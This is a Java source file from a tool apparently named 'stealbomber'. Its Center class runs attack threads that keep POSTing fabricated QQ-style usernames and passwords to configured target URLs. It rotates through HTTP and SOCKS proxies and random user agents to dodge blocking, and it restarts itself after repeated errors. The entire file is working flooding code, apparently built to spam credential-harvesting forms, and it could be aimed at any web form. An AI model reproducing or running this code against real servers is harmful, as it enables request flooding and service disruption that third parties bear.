package stealbomber.attack;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

import stealbomber.manage.ThreadControl;

/**
 * 攻击线程和主要方法
 * 
 * @author ObcbO
 */
public class Center implements Runnable {
    private static String[] proxyhttp;
    private static String[] proxysocks;
    private static boolean proxyhttpswich = false;
    private static boolean proxysocksswich = false;
    private static Random random = new Random();

    /** 错误次数 */
    private static int error = 0;
    /** final值 */
    private static final String ERR = "Connect timed out";
    /** final长度 */
    private static final int UAL = stealbomber.manage.Storage.UA.length;
    private static final int NUMSEGL = stealbomber.manage.Storage.NUMSEG.length;

    {// 初始化
        if (stealbomber.manage.GetFile.proxyswitch) {
            proxyhttp = AckProxy.readhttp(stealbomber.manage.GetFile.proxyfile);
            if (proxyhttp != null) {
                proxyhttpswich = true;
            }
            proxysocks = AckProxy.readsocks(stealbomber.manage.GetFile.proxyfile);
            if (proxysocks != null) {
                proxysocksswich = true;
            }
        }
    }

    public void run() {
        // proxy
        String proxyurl = "";
        String[] proxyiurl = { "", "" };

        String proxytype = "";
        String proxyhost = "";
        int proxyport = 0;
        if (stealbomber.manage.GetFile.proxyswitch) {
            if (proxyhttpswich && proxysocksswich) {
                if (random.nextBoolean()) {
                    proxytype = "http";
                    proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
                } else {
                    proxytype = "socks";
                    proxyurl = proxysocks[random.nextInt(proxysocks.length)];
                }
            } else if (proxyhttpswich && !proxysocksswich) {
                proxytype = "http";
                proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
            } else if (!proxyhttpswich && proxysocksswich) {
                proxytype = "socks";
                proxyurl = proxysocks[random.nextInt(proxysocks.length)];
            }
            proxyiurl = AckProxy.iurl(proxyurl);
            proxyhost = proxyiurl[0];
            proxyport = Integer.valueOf(proxyiurl[1]);
            proxyurl = null;
            proxyiurl = null;
        }
        while (ThreadControl.on) {
            // System.out.println(Thread.currentThread().getName());
            // url
            String url = stealbomber.manage.GetFile.urls.length == 1 ? stealbomber.manage.GetFile.urls[0]
                    : stealbomber.manage.GetFile.urls[random.nextInt(stealbomber.manage.GetFile.urls.length - 1)];
            // name
            StringBuilder username = new StringBuilder();
            switch (ThreadLocalRandom.current().nextInt(2)) {
                case 2:
                    username.append(
                            stealbomber.manage.Storage.NUMSEG[ThreadLocalRandom.current().nextInt(NUMSEGL)]);
                    for (byte i = 0; i < 8; i++) {
                        username.append(ThreadLocalRandom.current().nextInt(10));
                    }
                    break;
                case 1:
                    for (byte i = 0; i < ThreadLocalRandom.current().nextInt(8, 13); i++) {
                        if (i == 0) {
                            username.append(ThreadLocalRandom.current().nextInt(1, 10));
                        } else {
                            username.append(ThreadLocalRandom.current().nextInt(10));
                        }
                    }
                    username.append("@qq.com");
                    break;
                case 0:
                default:
                    for (byte i = 0; i < ThreadLocalRandom.current().nextInt(8, 13); i++) {
                        if (i == 0) {
                            username.append(ThreadLocalRandom.current().nextInt(1, 10));
                        } else {
                            username.append(ThreadLocalRandom.current().nextInt(10));
                        }
                    }
                    break;
            }
            // rp
            go(username.toString(), Password.get(), url, proxytype, proxyhost, proxyport);
        }
    }

    private static void go(String name, String pass, String surl, String proxytype, String proxyurl, int proxyport) {
        HttpURLConnection urlConn = null;
        try {
            URL url = new URL(surl);
            if (!stealbomber.manage.GetFile.proxyswitch) {
                urlConn = (HttpURLConnection) url.openConnection();
            } else {
                if ("http".equals(proxytype)) {
                    Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyurl, proxyport));
                    urlConn = (HttpURLConnection) url.openConnection(proxy);
                } else if ("socks".equals(proxytype)) {
                    Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(proxyurl, proxyport));
                    urlConn = (HttpURLConnection) url.openConnection(proxy);
                }
            }
            urlConn.setRequestMethod("POST");
            // 超时时间
            urlConn.setConnectTimeout(3000);
            // 设置是否输出
            urlConn.setDoOutput(true);
            // 设置是否读入
            urlConn.setDoInput(true);
            // 设置是否使用缓存
            urlConn.setUseCaches(false);
            // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
            urlConn.setInstanceFollowRedirects(false);
            // 设置请求头
            urlConn.setRequestProperty("Content-Length", "40");
            urlConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            urlConn.setRequestProperty("User-Agent",
                    stealbomber.manage.Storage.UA[ThreadLocalRandom.current().nextInt(UAL)]);
            // 连接
            urlConn.connect();
            // 写入参数到请求中
            String param = stealbomber.manage.GetFile.param.replace("$[account]", name);
            param = param.replace("$[password]", pass);
            OutputStream out = urlConn.getOutputStream();
            out.write(param.getBytes());
            out.flush();
            out.close();
            // 输出
            if (stealbomber.manage.GetFile.gps) {
                System.out.println(name + " " + pass);
            }
        } catch (IOException e) {
            if (stealbomber.manage.GetFile.gpr) {
                System.out.println(surl + " 转发出错，错误信息：" + e.getLocalizedMessage() + ";" + e.getClass());
            }
            if (error >= 100) {
                error = 0;
                ThreadControl.stop();
                new Thread(new Runnable() {
                    public void run() {
                        if (stealbomber.manage.GetFile.gpr) {
                            System.out.println("\n错误次数过多, 正在重新启动 10s\n");
                        }
                        try {
                            Thread.sleep(10000);// 1000ms=1s
                        } catch (InterruptedException e1) {
                        }
                        ThreadControl.start();
                    }
                }, "ReloadThread").start();
            } else if (!ERR.equals(e.getLocalizedMessage())) {
                error = error + 5;
            } else if (ERR.equals(e.getLocalizedMessage())) {
                error++;
            }
        } finally {
            if (null != urlConn) {
                try {
                    urlConn.disconnect();
                } catch (Exception e) {
                    System.out.println(surl + " httpURLConnection 流关闭异常：" + e.getLocalizedMessage());
                }
            }
        }
    }
}